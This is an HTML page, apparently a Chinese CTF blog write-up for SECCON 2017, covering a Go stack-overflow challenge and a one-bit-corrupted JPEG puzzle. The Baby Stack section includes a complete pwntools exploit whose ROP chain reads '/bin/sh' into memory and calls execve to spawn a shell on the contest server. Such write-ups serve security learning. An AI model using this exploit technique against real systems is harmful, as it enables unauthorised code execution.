@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这次和FlappyPig和蓝莲花合体 lotus-pig">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCON 2017 Online CTF">
+<meta property="og:url" content="https://bestwing.me/2017-SECCON-OnlineCTF.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="这次和FlappyPig和蓝莲花合体 lotus-pig">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg">
+<meta property="article:published_time" content="2017-12-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:28:14.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="SECCON">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SECCON 2017 Online CTF</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/hhkb_with_chrome.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017-Shanghai-DCTF-final-pwn.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-SECCON-OnlineCTF.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&text=SECCON 2017 Online CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&is_video=false&description=SECCON 2017 Online CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON 2017 Online CTF&body=Check out this article: https://bestwing.me/2017-SECCON-OnlineCTF.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&name=SECCON 2017 Online CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-SECCON-OnlineCTF.html&t=SECCON 2017 Online CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-Stack"><span class="toc-number">1.</span> <span class="toc-text">Baby Stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analysis"><span class="toc-number">1.1.</span> <span class="toc-text">analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JPEG-file"><span class="toc-number">1.2.</span> <span class="toc-text">JPEG file</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SECCON 2017 Online CTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-12-10T16:00:00.000Z" itemprop="datePublished">2017-12-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SECCON/" rel="tag">SECCON</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-result.jpg"></p>
+<h1 id="Baby-Stack"><a href="#Baby-Stack" class="headerlink" title="Baby Stack"></a>Baby Stack</h1><p>一个简单的缓冲区溢题目，程序由go 语言编写而成，所以并不能直接F5去分析。</p>
+<h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-01.jpg"></p>
+<p>程序的<code>main_memcpy</code>存在漏洞，可发生栈溢出</p>
+<p>在调试的过程中，我们会发现一个不一样的地方<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-02.jpg"></p>
+<p>正常，我们都是rip储存着返回地址，而这确实rsp存储的，这就意味着函数入口时的rsp指向retn地址，下面跟着参数</p>
+<p>另外还有一个问题，如果是只是单纯的<code>&quot;A&quot;*192+p64(ret)</code>程序是会报错的，</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-seccon-babystack-03.jpg"></p>
+<p>在<code>call main_memcpy </code>结束后，我们可以看到有两条汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012A4                 mov     rbx, [rsp+1f8h+name.str]</span><br><span class="line">.text:00000000004012AC                 mov     [rsp+1F8h+var_E0], rbx</span><br><span class="line">.text:00000000004012B4                 mov     rbx, [rsp+1f8h+name.len]</span><br></pre></td></tr></table></figure>
+<p>有两条栈操作，对象分别是name的字符串以及一个name的长度，于是我们构造一个<br><code>payload = &quot;B&quot; * 104 + p64(0x0000000000599940) + p64(0x200) + &quot;D&quot; * 8</code></p>
+<p>那么剩下的事情只要构造 rop-chain就行了<br>思路如下，构造一个read 读入 /bin/sh , 读入地址在bss上，然后构造 execve 去执行 /bin/sh</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&quot;./baby_stack&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./baby_stack&quot;</span>])</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;baby_stack.pwn.seccon.jp&quot;</span>, <span class="string">&quot;15285&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x000000000059f920</span></span><br><span class="line">syscall = <span class="number">0x0000000000456889</span>    <span class="comment"># syscall; ret;</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004016ea</span>    <span class="comment"># pop rax; ret;</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000046defd</span>    <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000470931</span>    <span class="comment"># pop rdi; or byte ptr [rax + 0x39], cl; ret;</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004a247c</span>    <span class="comment"># pop rdx; or byte ptr [rax - 0x77], cl; ret;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name &gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A&quot;</span> * <span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message &gt;&gt; &quot;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;---- debug ----&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;B&quot;</span>*<span class="number">104</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;B&quot;</span> * <span class="number">104</span> + p64(<span class="number">0x0000000000599940</span>) + p64(<span class="number">0x200</span>) + <span class="string">&quot;D&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">0x48</span> + p64(syscall) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += <span class="string">&quot;E&quot;</span> * (<span class="number">0x80</span> + <span class="number">0x40</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)        <span class="comment"># read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">59</span>)  <span class="comment"># __NR_execve</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;&#x27;&#x27;break *0x40129F</span></span><br><span class="line"><span class="string">				break *0x401465&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="JPEG-file"><a href="#JPEG-file" class="headerlink" title="JPEG file"></a>JPEG file</h2><p>JPEG file<br>Read this JPEG is broken.<br>It will be fixed if you change somewhere by 1 bit.</p>
+<p><a href="https://www.imagemagick.org/script/identify.php">https://www.imagemagick.org/script/identify.php</a><br>用这的工具去检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">magick identify -verbose tktk.jpg</span><br><span class="line">Image: tktk.jpg</span><br><span class="line">  Format: JPEG (Joint Photographic Experts Group JFIF format)</span><br><span class="line">  Mime <span class="built_in">type</span>: image/jpeg</span><br><span class="line">  Class: DirectClass</span><br><span class="line">  Geometry: 339x53+0+0</span><br><span class="line">  Resolution: 192x192</span><br><span class="line">  Print size: 1.76562x0.276042</span><br><span class="line">  Units: PixelsPerInch</span><br><span class="line">  Type: Grayscale</span><br><span class="line">  Base <span class="built_in">type</span>: TrueColor</span><br><span class="line">  Endianess: Undefined</span><br><span class="line">  Colorspace: sRGB</span><br><span class="line">  Depth: 8-bit</span><br><span class="line">  Channel depth:</span><br><span class="line">    Gray: 8-bit</span><br><span class="line">  Channel statistics:</span><br><span class="line">    Pixels: 17967</span><br><span class="line">    Gray:</span><br><span class="line">      min: 99  (0.388235)</span><br><span class="line">      max: 153 (0.6)</span><br><span class="line">      mean: 128.001 (0.501966)</span><br><span class="line">      standard deviation: 0.796015 (0.00312163)</span><br><span class="line">      kurtosis: 879.955</span><br><span class="line">      skewness: 0.249206</span><br><span class="line">      entropy: 0.0271321</span><br><span class="line">  Colors: 14</span><br><span class="line">  Histogram:</span><br><span class="line">         4: ( 99, 99, 99) <span class="comment">#636363 grey39</span></span><br><span class="line">         4: (113,113,113) <span class="comment">#717171 srgb(113,113,113)</span></span><br><span class="line">         4: (115,115,115) <span class="comment">#737373 grey45</span></span><br><span class="line">         4: (117,117,117) <span class="comment">#757575 grey46</span></span><br><span class="line">         4: (121,121,121) <span class="comment">#797979 srgb(121,121,121)</span></span><br><span class="line">        16: (126,126,126) <span class="comment">#7E7E7E gray</span></span><br><span class="line">        28: (127,127,127) <span class="comment">#7F7F7F grey50</span></span><br><span class="line">     17799: (128,128,128) <span class="comment">#808080 fractal</span></span><br><span class="line">        68: (129,129,129) <span class="comment">#818181 srgb(129,129,129)</span></span><br><span class="line">         4: (130,130,130) <span class="comment">#828282 grey51</span></span><br><span class="line">         8: (131,131,131) <span class="comment">#838383 srgb(131,131,131)</span></span><br><span class="line">        12: (132,132,132) <span class="comment">#848484 srgb(132,132,132)</span></span><br><span class="line">         4: (137,137,137) <span class="comment">#898989 srgb(137,137,137)</span></span><br><span class="line">         8: (153,153,153) <span class="comment">#999999 grey60</span></span><br><span class="line">  Rendering intent: Perceptual</span><br><span class="line">  Gamma: 0.454545</span><br><span class="line">  Chromaticity:</span><br><span class="line">    red primary: (0.64,0.33)</span><br><span class="line">    green primary: (0.3,0.6)</span><br><span class="line">    blue primary: (0.15,0.06)</span><br><span class="line">    white point: (0.3127,0.329)</span><br><span class="line">  Matte color: grey74</span><br><span class="line">  Background color: white</span><br><span class="line">  Border color: srgb(223,223,223)</span><br><span class="line">  Transparent color: none</span><br><span class="line">  Interlace: None</span><br><span class="line">  Intensity: Undefined</span><br><span class="line">  Compose: Over</span><br><span class="line">  Page geometry: 339x53+0+0</span><br><span class="line">  Dispose: Undefined</span><br><span class="line">  Iterations: 0</span><br><span class="line">  Compression: JPEG</span><br><span class="line">  Quality: 95</span><br><span class="line">  Orientation: Undefined</span><br><span class="line">  Properties:</span><br><span class="line">    date:create: 2017-12-12T15:19:55+08:00</span><br><span class="line">    date:modify: 2017-12-09T22:18:51+08:00</span><br><span class="line">    jpeg:colorspace: 2</span><br><span class="line">    jpeg:sampling-factor: 2x2,1x1,1x1</span><br><span class="line">    signature: be9fd7cce707a16b630c1db97798b1f402a0dd2da77fb636cc8e2647abcc768e</span><br><span class="line">  Artifacts:</span><br><span class="line">    verbose: <span class="literal">true</span></span><br><span class="line">  Tainted: False</span><br><span class="line">  Filesize: 11628B</span><br><span class="line">  Number pixels: 17967</span><br><span class="line">  Pixels per second: 898351B</span><br><span class="line">  User time: 0.010u</span><br><span class="line">  Elapsed time: 0:01.019</span><br><span class="line">  Version: ImageMagick 7.0.7-14 Q16 x86_64 2017-12-07 http://www.imagemagick.org</span><br><span class="line">identify: Corrupt JPEG data: premature end of data segment `tktk.jpg<span class="string">&#x27; @ warning/jpeg.c/JPEGWarningHandler/365.</span></span><br><span class="line"><span class="string">identify: Unsupported marker type 0xfc `tktk.jpg&#x27;</span> @ warning/jpeg.c/JPEGErrorHandler/329.</span><br></pre></td></tr></table></figure>
+
+<p>可以看到错误的字节是 0xfc<br>由于标记以0xFF开头，因此我们只需要在二进制文件中找到FF FC，并在0xFF中改变一些位以删除该无效标记</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/SECCON/re/jpg-file [15:23:57]</span></span><br><span class="line">$ binwalk -R <span class="string">&quot;\xFF\xFC&quot;</span> tktk.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">623           0x26F           \xFF\xFC</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>确定偏移后 就是暴力出奇迹的时候了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;./tktk&quot;</span>)</span><br><span class="line">origin = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">byte =  <span class="number">623</span></span><br><span class="line">bit = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment">#if(raw_input() == &quot;b&quot;):</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Byte, bit: %d, %d&quot;</span> % (byte, bit)</span><br><span class="line">    content = origin[:byte] + chr(ord(origin[byte]) ^ (<span class="number">1</span> &lt;&lt; bit)) + origin[byte+<span class="number">1</span>:]</span><br><span class="line">    outfile = open(<span class="string">&quot;./tktkout.jpg&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    outfile.write(content)</span><br><span class="line">    outfile.close()</span><br><span class="line">    bit += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(bit == <span class="number">8</span>):</span><br><span class="line">        bit = <span class="number">0</span></span><br><span class="line">        byte += <span class="number">1</span></span><br><span class="line">    os.system(<span class="string">&quot;/Users/xxx/.iterm2/imgcat ./tktkout.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[[‘T’, ‘h’, ‘e’, ‘q’, ‘u’, ‘i’, ‘c’], [‘k’, ‘b’, ‘r’, ‘o’, ‘w’, ‘n’, ‘f’], [‘o’, ‘x’, ‘j’, ‘u’, ‘m’, ‘p’, ‘s’], [‘o’, ‘v’, ‘e’, ‘r’, ‘t’, ‘h’, ‘e’], [‘l’, ‘a’, ‘z’,’y’, ‘d’, ‘o’, ‘g’]]</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-Stack"><span class="toc-number">1.</span> <span class="toc-text">Baby Stack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analysis"><span class="toc-number">1.1.</span> <span class="toc-text">analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JPEG-file"><span class="toc-number">1.2.</span> <span class="toc-text">JPEG file</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-SECCON-OnlineCTF.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&text=SECCON 2017 Online CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&is_video=false&description=SECCON 2017 Online CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SECCON 2017 Online CTF&body=Check out this article: https://bestwing.me/2017-SECCON-OnlineCTF.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&title=SECCON 2017 Online CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-SECCON-OnlineCTF.html&name=SECCON 2017 Online CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-SECCON-OnlineCTF.html&t=SECCON 2017 Online CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
